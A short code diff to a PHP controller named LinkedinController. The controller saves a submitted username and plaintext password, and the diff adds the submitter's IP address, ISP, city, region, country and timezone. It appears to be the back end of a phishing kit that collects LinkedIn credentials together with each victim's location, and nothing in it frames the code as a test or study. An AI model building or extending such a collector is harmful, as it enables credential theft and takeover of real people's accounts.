@@ -41,6 +41,12 @@ class LinkedinController extends Controller
 
         $dataLinkedin->username = $request->username;
         $dataLinkedin->password = $request->password;
+        $dataLinkedin->ip = $request->ip;
+        $dataLinkedin->isp = $request->isp;
+        $dataLinkedin->city = $request->city;
+        $dataLinkedin->region = $request->region;
+        $dataLinkedin->country = $request->country;
+        $dataLinkedin->timezone = $request->timezone;
         
         $dataLinkedin->save();
 
